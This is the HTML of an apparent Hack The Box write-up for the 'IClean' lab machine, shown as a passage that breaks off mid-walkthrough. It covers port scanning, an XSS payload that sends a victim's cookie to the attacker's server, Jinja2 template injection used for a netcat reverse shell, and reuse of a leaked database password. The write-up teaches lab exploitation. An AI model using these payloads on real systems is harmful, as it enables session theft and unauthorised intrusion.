@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset='utf-8'>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index, follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
+    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
+    crossorigin="anonymous"></script>
+  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+    </script>
+  <link rel="stylesheet" href="/assets/css/style.css?v=d49a3e43e60e0e96a855de35e78edc7d81851d19">
+  <link rel="stylesheet" href="/assets/css/prism.css">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
+  
+  <meta name="theme-color" content="#000000" />
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB IClean writeup | Gabriel blog</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="HTB IClean writeup" />
+<meta name="author" content="gabri47" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="IClean is a Linux medium machine about… {WRITE MORE}" />
+<meta property="og:description" content="IClean is a Linux medium machine about… {WRITE MORE}" />
+<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/IClean.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/IClean.html" />
+<meta property="og:site_name" content="Gabriel blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-07-31T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB IClean writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-07-31T00:00:00+02:00","datePublished":"2024-07-31T00:00:00+02:00","description":"IClean is a Linux medium machine about… {WRITE MORE}","headline":"HTB IClean writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/IClean.html"},"url":"http://localhost:4000/writeups/2024/HTB/IClean.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+</head>
+
+<body>
+
+  <div id="header">
+    <div class="container">
+      <div class="title-container">
+        <a id="a-title" href="/">
+          <h1>Gabriel blog</h1>
+        </a>
+        <small class="nav-main d-flex justify-content-center">
+    
+    <a href="/writeups">Writeups</a>
+    
+     <span style="color: #b5e853;">|</span> 
+    
+    
+    <a href="/blog">Blog</a>
+    
+    
+</small>
+
+      </div>
+      <br>
+
+      
+      
+<nav class="navbar navlinks">
+    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
+        <span>HTB Writeups</span>
+        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
+    </button>
+
+    <div class="navbar-collapse collapse" id="navbarSupportedContent">
+        <div class="m-1 mt-2">
+
+            
+            
+            
+
+            
+            
+            
+
+            <small class="m-2">2024</small>
+            
+            <ul style="padding-top: 0.1em;">
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
+                    <br>
+                    <small>[40]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Perfection.html"> HTB Perfection writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Corporate.html"> HTB Corporate writeup</a>
+                    <br>
+                    <small>[50]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;bypass-csp/&gt; &lt;cookie-hijacking/&gt; &lt;idor/&gt; &lt;vpn/&gt; &lt;password-spraying/&gt; &lt;.mozilla-enumeration/&gt; &lt;bruteforce-bitwarden-pin/&gt; &lt;source-code-analysis/&gt; &lt;cookie-forging/&gt; &lt;jwt/&gt; &lt;docker-privesc/&gt; &lt;abupve/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/Headless.html"> HTB Headless writeup</a>
+                    <br>
+                    <small>[20]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;xss/&gt; &lt;command-injection/&gt; &lt;sudoers/&gt; &lt;path-hijacking-.//&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/WifineticTwo.html"> HTB WifineticTwo writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;openplc/&gt; &lt;cve-2021-31630/&gt; &lt;wifi-scanning/&gt; &lt;pixiedust/&gt; &lt;port-scanning/&gt; &lt;ssh/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                <li style="line-height: 1; padding-top: 0.4em;">
+                    <a href="http://localhost:4000/writeups/2024/HTB/IClean.html"> HTB IClean writeup</a>
+                    <br>
+                    <small>[30]</small>
+                    <span class="tag">
+                        <small>
+                            &lt;/&gt;
+                        </small>
+                    </span>
+                </li>
+                
+                
+                
+                
+                
+                
+            </ul>
+
+            
+            
+
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+      
+
+      
+      <div id="bottom-bar">
+        <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+      </div>
+    </div>
+  </div>
+
+  <div id="content" class="container">
+    <section id="main_content">
+      <h5 class="mt-0 mb-2">
+        
+        
+          HTB
+        
+        
+      </h5>
+    
+      <h1 class="d-flex w-100 justify-content-between">
+        
+        
+          <span>HTB IClean writeup</span> <span class="points"> [30 pts] </span>
+        
+        
+      </h1>
+
+
+<script>
+
+</script>
+
+<p>IClean is a Linux medium machine about… {WRITE MORE}</p>
+    
+      <h1 id="enumeration">
+        
+        
+          Enumeration <a href="#enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+    
+      <h2 id="port-scanning">
+        
+        
+          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>
+
+<pre><code class="language-bash"># Nmap 7.94SVN scan initiated Wed Jul 31 00:17:33 2024 as: nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn -oN iclean 10.10.11.12
+Nmap scan report for 10.10.11.12
+Host is up (0.035s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
+|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jul 31 00:17:51 2024 -- 1 IP address (1 host up) scanned in 18.25 seconds
+</code></pre>
+
+<ul>
+  <li>-sVC: Identifies service and version.</li>
+  <li>-p-: scans all the range of ports (1-65535).</li>
+  <li>–open: shows only open ports and not filtered or closed.</li>
+  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
+  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
+real environment).</li>
+  <li>-n: Disables DNS resolution protocol.</li>
+  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
+  <li>-Pn: Disables host discovery protocol (ping).</li>
+  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
+</ul>
+
+<p>There is port 80 running apache server, so let’s jump into it.</p>
+    
+      <h2 id="web-enumeration">
+        
+        
+          Web enumeration <a href="#web-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h2>
+
+<p>Looking at the server response, it’s very short:</p>
+
+<pre><code class="language-bash">❯ curl -i http://10.10.11.12
+HTTP/1.1 200 OK
+Date: Tue, 30 Jul 2024 22:19:37 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Last-Modified: Tue, 05 Sep 2023 16:40:51 GMT
+ETag: "112-6049f4a35f3a4"
+Accept-Ranges: bytes
+Content-Length: 274
+Vary: Accept-Encoding
+Content-Type: text/html
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta http-equiv="refresh" content="0;url=http://capiclean.htb"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Optional content for users without JavaScript --&gt;
+    &lt;p&gt;If you are not redirected, &lt;a href="http://capiclean.htb"&gt;click here&lt;/a&gt;.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>It redirects to capiclean.htb, so I will add this line to the /etc/hosts:</p>
+
+<pre><code class="language-plaintext">10.10.11.12 capiclean.htb
+</code></pre>
+
+<p>This page shows a cleaning service web:</p>
+
+<p><img src="/assets/images/IClean/capiclean.htb.png" alt="capiclean.htb main page"></p>
+
+<p>Looking more below, it’s possible to see a “Get a quote” button:</p>
+
+<p><img src="/assets/images/IClean/get-a-quote-capiclean.htb.png" alt="get a quote button"></p>
+
+<p>There, I can request a service to clean something, which makes a POST request to /sendMessage:</p>
+
+<p><img src="/assets/images/IClean/quote-page.png" alt="quote page"></p>
+
+<p><img src="/assets/images/IClean/get-a-quote-request.png" alt="get a quote request"></p>
+
+<p>As it seems to send a message, I will try an HTML injection that loads an image from my http server. For that, I will start a simple python http server:</p>
+
+<pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<p><img src="/assets/images/IClean/tried-html-injection.png" alt="tried html injection"></p>
+
+<p>The response doesn’t change, but we receive a request for test.jpg from the machine’s IP (10.10.11.12):</p>
+
+<p><img src="/assets/images/IClean/request-for-test.jpg.png" alt="request for test.jpg"></p>
+
+<p>I will try to retrieve somebody’s cookie by injecting a script which sends a request to my server with his cookie as the route. Trying with <code>&lt;script&gt;fetch("http://10.10.15.95/"+document.cookie)&lt;/script&gt;</code> doesn’t works but with a onerror declaration of an img tag, I can successfully retrieve somebody’s cookie:</p>
+
+<p><img src="/assets/images/IClean/onerror-img-send-cookie.png" alt="onerror img send cookie"></p>
+
+<pre><code class="language-c">10.10.11.12 - - [31/Jul/2024 00:44:32] code 404, message File not found
+10.10.11.12 - - [31/Jul/2024 00:44:32] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqlNgw.V8pGQ30feKi2NhOM1MrEEUvxMcY HTTP/1.1" 404 -
+</code></pre>
+
+<p>Fuzzing to find a route where this cookie would be useful, I can see /dashboard, which without cookie gives a redirect to /:</p>
+
+<pre><code class="language-c">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://capiclean.htb/FUZZ -mc all -fc 404
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://capiclean.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response status: 404
+________________________________________________
+
+login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 44ms]
+logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 53ms]
+about                   [Status: 200, Size: 5267, Words: 1036, Lines: 130, Duration: 67ms]
+services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 72ms]
+.                       [Status: 200, Size: 16697, Words: 4654, Lines: 349, Duration: 85ms]
+dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 74ms]
+team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 84ms]
+quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 78ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 32ms]
+choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 115ms]
+sendMessage             [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 151ms]
+:: Progress: [119600/119600] :: Job [1/1] :: 203 req/sec :: Duration: [0:06:04] :: Errors: 0 ::
+</code></pre>
+
+<pre><code class="language-plaintext">❯ curl -i http://capiclean.htb/dashboard
+HTTP/1.1 302 FOUND
+Date: Tue, 30 Jul 2024 22:58:29 GMT
+Server: Werkzeug/2.3.7 Python/3.10.12
+Content-Type: text/html; charset=utf-8
+Content-Length: 189
+Location: /
+Vary: Cookie
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="/"&gt;/&lt;/a&gt;. If not, click the link.
+</code></pre>
+
+<p>So I will introduce this cookie into firefox and navigate to /dashboard:</p>
+
+<p><img src="/assets/images/IClean/dashboard-with-cookie.png" alt="dashboard with cookie"></p>
+
+<p>There’s a bunch of functionalities here, let’s see each one carefully.</p>
+    
+      <h3 id="generate-invoice">
+        
+        
+          Generate Invoice
+        
+        
+      </h3>
+
+<p>This leds to /InvoiceGenerator, its to generate a invoice for the clients that want the cleaning service:</p>
+
+<p><img src="/assets/images/IClean/invoiceGenerator.png" alt="invoiceGenerator"></p>
+
+<p>When some data is submitted, it gives a “Invoice ID”:</p>
+
+<p><img src="/assets/images/IClean/invoiceGeneratorRequest.png" alt="invoiceGenerator request"></p>
+    
+      <h3 id="generate-qr">
+        
+        
+          Generate QR
+        
+        
+      </h3>
+
+<p>This page asks for a Invoice ID:</p>
+
+<p><img src="/assets/images/IClean/qrGenerator.png" alt="QR Generator"></p>
+
+<p>I will introduce the one I created before and see what happens:</p>
+
+<p><img src="/assets/images/IClean/qrGeneratorRequest.png" alt="QR Generator Request"></p>
+
+<p><img src="/assets/images/IClean/qr-generator-response-browser.png" alt="QR Generator Response browser"></p>
+
+<p>Now, it gives a valid link for an image (which is a QR) that looks like this:</p>
+
+<p><img src="/assets/images/IClean/qr-code-png.png" alt="QR Code png"></p>
+
+<p>Also, there is a new form to generate the scannable invoice where I need to introduce the qr link given. I will introduce it and see it reflects my data:</p>
+
+<p><img src="/assets/images/IClean/scannable-invoice-response.png" alt="scannable invoice response"></p>
+
+<p>Also notice that the img is loaded with the data:// wrapper:</p>
+
+<p><img src="/assets/images/IClean/qr-image-data-wrapper.png" alt="qr image data wrapper"></p>
+
+<p>For some strange reason, if I inject a SSTI payload, it interprets and shows the data there:</p>
+
+<p><img src="/assets/images/IClean/ssti-qr_link.png" alt="ssti qr_link"></p>
+    
+      <h1 id="access-as-www-data">
+        
+        
+          Access as www-data <a href="#access-as-www-data" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>The only payload that works in this case to execute commands it’s this from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">payloadallthethings</a>:</p>
+
+<p><img src="/assets/images/IClean/ssti-command-injection.png" alt="ssti command injection"></p>
+
+<p>So I will start a nc listener to receive a shell and start the typical one with bash:</p>
+
+<pre><code class="language-bash">❯ nc -lvnp 443
+listening on [any] 443 ...
+</code></pre>
+
+<p><img src="/assets/images/IClean/reverse-shell-executed.png" alt="reverse shell executed"></p>
+
+<p>And I receive the reverse shell!:</p>
+
+<p><img src="/assets/images/IClean/shell-received.png" alt="shell received"></p>
+
+<p>The <code>script /dev/null -c bash</code> command doesn’t work here:</p>
+
+<pre><code class="language-bash">www-data@iclean:/opt/app$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+This account is currently not available.
+Script done.
+</code></pre>
+
+<p>So I will use python instead and do the same as always for a proper shell:</p>
+
+<pre><code class="language-bash">www-data@iclean:/opt/app$ python3 -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+www-data@iclean:/opt/app$ ^Z
+[1]  + 40695 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 40695 continued  nc -lvnp 443
+                                    reset xterm
+www-data@iclean:/opt/app$ export TERM=xterm
+www-data@iclean:/opt/app$ export SHELL=bash
+www-data@iclean:/opt/app$ stty rows 50 columns 184
+</code></pre>
+
+<ul>
+  <li>
+<code>python3 -c "import pty; pty.spawn('/bin/bash')"</code>: Spawns a tty.</li>
+  <li>
+<code>ctrl+z</code>: puts the shell in background for later doing a treatment.</li>
+  <li>
+<code>stty raw -echo;fg</code>: give us the shell back again.</li>
+  <li>
+<code>reset xterm</code>: resets the terminal to give us the bash console.</li>
+  <li>
+<code>export TERM=xterm</code>: let us do ctrl+l to clean the terminal.</li>
+  <li>
+<code>export SHELL=bash</code>: specifies the system that we are using a bash console.</li>
+  <li>
+<code>stty rows &lt;YOUR ROWS&gt; columns &lt;YOUR COLUMNS&gt;</code>: establishes the size of the current full terminal window, you can view the adequate running stty size on your machine (you 
+can view it with <code>stty size</code> in a complete new window).</li>
+</ul>
+    
+      <h1 id="access-as-consuela">
+        
+        
+          Access as consuela <a href="#access-as-consuela" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
+        
+        
+      </h1>
+
+<p>Looking at the users with shell (ends with sh), there is only one user called ‘consuela’ apart from root:</p>
+
+<pre><code class="language-bash">www-data@iclean:/opt/app$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
+</code></pre>
+
+<p>Also, in the app.py, to check the users it’s using a SQL database:</p>
+
+<pre><code class="language-python">www-data@iclean:/opt/app$ cat app.py 
+from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
+from flask import render_template_string
+import pymysql
+import hashlib
+import os
+import random, string
+import pyqrcode
+from jinja2 import StrictUndefined
+from io import BytesIO
+import re, requests, base64
+
+app = Flask(__name__)
+
+app.config['SESSION_COOKIE_HTTPONLY'] = False
+
+secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
+app.secret_key = secret_key
+# Database Configuration
+db_config = {
+    'host': '127.0.0.1',
+    'user': 'iclean',
+    'password': 'pxCsmnGLckUb',
+    'database': 'capiclean'
+}
+
+&lt;..SNIP..&gt;
+</code></pre>
+
+<p>This password doesn’t work with consuela:</p>
+
+<pre><code class="language-bash">www-data@iclean:/opt/app$ su consuela
+Password: pxCsmnGLckUb
+su: Authentication failure
+</code></pre>
+
+<p>But I can connect to the database:</p>
+
+<pre><code class="language-bash">www-data@iclean:/opt/app$ mysql -u'iclean' -p
+Enter password: pxCsmnGLckUb
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 450
+Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; 
+</code></pre>
+
+<p>In the capiclean database there is a ‘users’ table:</p>
+
+<pre><code class="language-bash">mysql&gt; use capiclean;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables;
++---------------------+
+| Tables_in_capiclean |
++---------------------+
+| quote_requests      |
+| services            |
+| users               |
++---------------------+
+3 rows in set (0.01 sec)
+</code></pre>
+
+<p>I will describe it to see the columns and extract the interesting ones:</p>
+
+<pre><code class="language-bash">mysql&gt; describe users;
